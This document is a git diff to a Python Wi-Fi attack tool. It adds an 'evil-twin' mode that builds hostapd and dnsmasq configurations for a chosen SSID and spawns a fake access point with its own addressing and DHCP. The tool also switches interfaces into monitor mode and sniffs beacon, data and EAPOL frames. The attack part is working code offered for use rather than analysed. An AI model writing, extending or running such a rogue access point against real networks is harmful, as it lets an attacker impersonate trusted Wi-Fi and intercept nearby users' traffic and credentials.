@@ -6,14 +6,24 @@ import subprocess
 import pretty_lib as pl
 import time
 import ap_collector as apc
+import os
 
 BPF_BEACON = "type mgt && subtype beacon"
 BPF_DATA = "type data && subtype qos-data && wlan ta "
 BPF_EAPOL = "ether proto 0x888e"
 
+AP_CONF_TEMPLATE = "apconf_template.conf"
+AP_CONF = "apconf.conf"
+DNSMASQ_CONF_TEMPLATE = "dnsmasq_template.conf"
+DNSMASQ_CONF="dnsmasq.conf"
 
-def signal_handler(sig):
+hostapd_proc = None
+dnsmasq_proc = None
+current_nic = None
+
+def signal_handler(sig, frame):
     if (sig == signal.SIGINT):
+        cleanup()
         sys.exit(-1)
 
 def sp_error_handler(e):
@@ -30,18 +40,34 @@ def get_nics():
         print(pl.BOLD + str(index) + "- " + el + pl.ENDC)
         index+=1
 
-def set_monitor_mode(nic, flag):
+def cleanup():
+    if hostapd_proc:
+        print("hostapd process found! Killing it ...")
+        hostapd_proc.terminate()
+    if dnsmasq_proc:
+        print("dnsmasq process found! Killing it ...")
+        dnsmasq_proc.terminate()
+    set_nic_mode(current_nic, "managed")  
     try:
-        if flag:
+        subprocess.run(["sudo", "ip", "addr", "flush", "dev", current_nic], check=True)
+    except Exception as e:
+        sp_error_handler(e)
+    
+    
+def set_nic_mode(nic, flag):
+    try:
+        if flag == "monitor":
             print("Enabling monitor mode for the interface \"" + nic + "\" ...", end=" ")
             subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
             subprocess.run(["sudo", "iw", nic, "set", "type", "monitor"], check=True)
             subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
-        else:
+        elif flag == "managed":
             print("Disabling monitor mode for the interface \"" + nic + "\" ...", end=" ")
             subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
             subprocess.run(["sudo", "iw", nic, "set", "type", "managed"], check=True)
             subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
+        else:
+            return
         time.sleep(1)
         print(pl.BOLD + pl.GREEN + "done" + pl.ENDC)
     except Exception as e:
@@ -56,7 +82,6 @@ def set_nic_channel(nic, channel):
     print(pl.BOLD + pl.GREEN + "done" + pl.ENDC)
 
 def sniff_beacon_frame(nic, current_channel, ap_collector):
-    set_monitor_mode(nic, True)    
     done=False
     while not done:
         set_nic_channel(nic, current_channel)
@@ -65,7 +90,6 @@ def sniff_beacon_frame(nic, current_channel, ap_collector):
         if current_channel == 13:
             done = True
             ap_collector.pprint()   
-    set_monitor_mode(nic, False)    
 
 def beacon_frame_manager(ap_collector):
     def handle_beacon_frame(pkt):
@@ -108,6 +132,39 @@ def data_frame_manager(stations):
         stations.append(station_mac)
     return handle_data_frame
 
+def build_ap_conf(nic, ssid):
+    with open(AP_CONF_TEMPLATE, "r") as f1, open(DNSMASQ_CONF_TEMPLATE, "r") as f2:
+        ap_template = f1.read()
+        ap_conf = (ap_template
+            .replace("{{NIC}}", nic)
+            .replace("{{SSID}}", ssid)
+        )
+        dnsmasq_template = f2.read()
+        dnsmasq_conf = dnsmasq_template.replace("{{NIC}}", nic)
+    with open(AP_CONF, "w") as f1, open(DNSMASQ_CONF, "w") as f2:
+        f1.write(ap_conf)            
+        f2.write(dnsmasq_conf)
+ 
+def spawn_fake_ap(nic):
+    global hostapd_proc, dnsmasq_proc
+    try:
+        hostapd_proc = subprocess.Popen(["sudo", "hostapd", AP_CONF],
+            preexec_fn=os.setsid,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        time.sleep(1) # Initialize phase
+        subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
+        subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24", "dev", nic], check=True)
+        subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
+        dnsmasq_proc = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", "dnsmasq.conf"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+        signal.pause()
+    except Exception as e:
+        sp_error_handler(e)
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
@@ -120,37 +177,46 @@ if __name__ == "__main__":
     parser.add_argument("-manm","--managed_mode", action="store_true", help="Put the specified interface in managed mode.")
     parser.add_argument("-i", "--interface", help="The network interface to use for the activities.")
     parser.add_argument("-s", "--scan", action="store_true", help="Scan on multiple channel to retrieve the nearby access points.")
-    parser.add_argument("-t", "--test", action="store_true", help="test option")
+    parser.add_argument("-et", "--evil_twin", action="store_true", help="Execute the evil-twin attack")
+    parser.add_argument("-ssid", "--ap_name", help="The SSID to use for the evil-twin attack.")
     args = parser.parse_args()
     
     if args.list:
         get_nics()
         sys.exit(1)
 
+    if args.interface:
+        current_nic = args.interface
+
     if args.monitor_mode and not args.interface:
-        parser.error("The -monm option requires the -i option.")
+        parser.error("The -monitor_mode option requires the -i option.")
 
     if args.managed_mode and not args.interface:
-        parser.error("The -manm option requires the -i option.")
+        parser.error("The --managed_mode option requires the -i option.")
 
     if args.scan and not args.interface:
-        parser.error("The -scan option requires the -i option.")
+        parser.error("The --scan option requires the -i option.")
 
-    if args.test:
-        sys.exit(1)        
-
+    if args.evil_twin and not (args.interface and args.ap_name):
+        parser.error("The --evil_twin option requires the options -i and -ssid.")
+        
     if args.monitor_mode:
-        set_monitor_mode(args.interface, True)
+        set_nic_mode(args.interface, "monitor")
         sys.exit(1)
 
     if args.managed_mode:
-        set_monitor_mode(args.interface, False)
+        set_nic_mode(args.interface, "managed")
         sys.exit(1)
 
     if args.scan:
+        set_nic_mode(args.interface, "monitor")
         current_channel = 1
         ap_collector = apc.AP_Collector()
         sniff_beacon_frame(args.interface, current_channel, ap_collector)
+
+    if args.evil_twin:
+        build_ap_conf(args.interface, args.ap_name)
+        spawn_fake_ap(args.interface)
 
     # if args.get_stations:
     #     set_monitor_mode(args.interface, True)
